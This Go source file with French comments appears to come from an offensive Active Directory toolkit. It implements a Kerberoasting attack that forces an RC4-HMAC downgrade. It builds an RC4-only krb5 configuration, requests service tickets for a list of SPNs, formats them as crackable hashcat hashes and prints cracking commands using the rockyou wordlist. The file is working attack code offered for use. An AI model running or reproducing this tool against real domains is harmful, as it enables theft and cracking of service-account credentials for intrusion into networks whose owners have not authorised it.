// pkg/kerberos/rc4downgrade.go
//
// RC4 downgrade pour Kerberoast
//
// Problème : les comptes modernes utilisent AES256 (enctype 18).
// Les hashes AES256 sont beaucoup plus longs à cracker que RC4-HMAC (enctype 23).
//
// Solution : forcer RC4-HMAC dans la TGS-REQ en ne proposant que l'enctype 23.
// Le KDC AD accepte la négociation vers RC4 tant que le compte le supporte.
//
// Résultat : hash hashcat mode 13100 (RC4) → crackable avec rockyou en minutes
// vs mode 19700 (AES256) → beaucoup plus lent.
//
// Implémentation : surcharger la config krb5 pour ne lister que RC4,
// ce qui force la négociation de l'enctype lors de la TGS-REQ.

package kerberos

import (
	"fmt"
	"strings"

	"github.com/jcmturner/gokrb5/v8/client"
	"github.com/jcmturner/gokrb5/v8/config"
)

// KerberoastRC4 force l'enctype RC4-HMAC (23) pour tous les tickets demandés.
// Retourne un hash hashcat mode 13100 (RC4) au lieu de 19700 (AES256).
//
// Si forceRC4 = true et que le KDC refuse RC4 (e.g. RC4 désactivé sur le DC),
// la fonction bascule automatiquement sur AES256.
func KerberoastTargetsRC4(username, domain, password, dcIP string, spnTargets []SPNTarget, forceRC4 bool) ([]KerberoastResult, error) {
	realm := strings.ToUpper(domain)

	var krb5Conf *config.Config
	var err error

	if forceRC4 {
		// Config krb5 qui ne propose QUE RC4-HMAC dans default_tkt_enctypes et default_tgs_enctypes
		krb5Conf, err = config.NewFromString(buildKrb5ConfigRC4(realm, dcIP))
	} else {
		krb5Conf, err = config.NewFromString(buildKrb5Config(realm, dcIP))
	}
	if err != nil {
		return nil, fmt.Errorf("kerberos config error: %v", err)
	}

	cl := client.NewWithPassword(username, realm, password, krb5Conf,
		client.DisablePAFXFAST(true))

	if err := cl.Login(); err != nil {
		if forceRC4 && strings.Contains(err.Error(), "KDC_ERR_ETYPE_NOSUPP") {
			// RC4 désactivé sur ce DC → fallback AES256
			fmt.Println("[!] RC4 not supported by KDC — falling back to AES256 (hashcat mode 19700)")
			return KerberoastTargets(username, domain, password, dcIP, spnTargets)
		}
		return nil, fmt.Errorf("authentication failed: %v", err)
	}

	fmt.Printf("[*] Requesting TGS for %d SPN(s)%s...\n",
		len(spnTargets),
		func() string {
			if forceRC4 {
				return " [RC4 forced]"
			}
			return ""
		}(),
	)

	var results []KerberoastResult
	for _, target := range spnTargets {
		fmt.Printf("[*] TGS-REQ → %-20s SPN: %s ... ", target.Username, target.SPN)

		tkt, _, err := cl.GetServiceTicket(target.SPN)
		if err != nil {
			fmt.Printf("FAILED: %v\n", err)
			results = append(results, KerberoastResult{
				Username: target.Username,
				SPN:      target.SPN,
				Error:    err.Error(),
			})
			continue
		}

		encType := int(tkt.EncPart.EType)
		hash := FormatKerberoastHash(target.Username, domain, target.SPN,
			tkt.EncPart.Cipher, encType)

		enctypeName := enctypeName(encType)
		fmt.Printf("OK (%s)\n", enctypeName)

		if encType == 18 || encType == 17 {
			fmt.Printf("  [!] Got AES — run: hashcat -m 19700 hash.txt wordlist.txt\n")
		} else {
			fmt.Printf("  [+] Got RC4 — run: hashcat -m 13100 hash.txt wordlist.txt\n")
		}

		results = append(results, KerberoastResult{
			Username: target.Username,
			SPN:      target.SPN,
			Hash:     hash,
		})
	}

	return results, nil
}

// buildKrb5ConfigRC4 génère une config krb5 qui ne propose que RC4-HMAC.
// Cela force le KDC à répondre avec RC4 lors de la TGS-REQ.
func buildKrb5ConfigRC4(realm, kdc string) string {
	lower := realmToLower(realm)
	return fmt.Sprintf(`[libdefaults]
    default_realm = %s
    dns_lookup_realm = false
    dns_lookup_kdc = false
    forwardable = true
    rdns = false
    default_tkt_enctypes = rc4-hmac
    default_tgs_enctypes = rc4-hmac
    permitted_enctypes = rc4-hmac

[realms]
    %s = {
        kdc = %s
        admin_server = %s
        default_tkt_enctypes = rc4-hmac
        default_tgs_enctypes = rc4-hmac
    }

[domain_realm]
    .%s = %s
    %s = %s
`, realm, realm, kdc, kdc, lower, realm, lower, realm)
}

// enctypeName retourne le nom lisible d'un enctype Kerberos
func enctypeName(enctype int) string {
	switch enctype {
	case 23:
		return "RC4-HMAC (crack: -m 13100)"
	case 17:
		return "AES128-CTS-HMAC-SHA1 (crack: -m 19600)"
	case 18:
		return "AES256-CTS-HMAC-SHA1 (crack: -m 19700)"
	case 3:
		return "DES-CBC-MD5 (deprecated)"
	default:
		return fmt.Sprintf("enctype-%d", enctype)
	}
}

// AnalyzeKerberoastHashes affiche des statistiques et conseils sur les hashes capturés
func AnalyzeKerberoastHashes(results []KerberoastResult) {
	rc4Count, aesCount, failCount := 0, 0, 0
	for _, r := range results {
		if r.Error != "" {
			failCount++
			continue
		}
		switch r.Hash.EncType {
		case 23:
			rc4Count++
		case 17, 18:
			aesCount++
		}
	}

	fmt.Println()
	fmt.Printf("[*] Hash analysis:\n")
	fmt.Printf("    RC4-HMAC  (mode 13100): %d — fast to crack\n", rc4Count)
	fmt.Printf("    AES       (mode 19700): %d — slow to crack\n", aesCount)
	fmt.Printf("    Failed:                %d\n", failCount)

	if aesCount > 0 && rc4Count == 0 {
		fmt.Println("\n[!] All hashes are AES. Try --force-rc4 to downgrade to RC4.")
		fmt.Println("    Note: RC4 downgrade requires RC4 to be enabled on the DC.")
		fmt.Println("    Alternative: use GPU-heavy AES cracking.")
		fmt.Printf("    hashcat -m 19700 hashes.txt /usr/share/wordlists/rockyou.txt\n")
	}
}
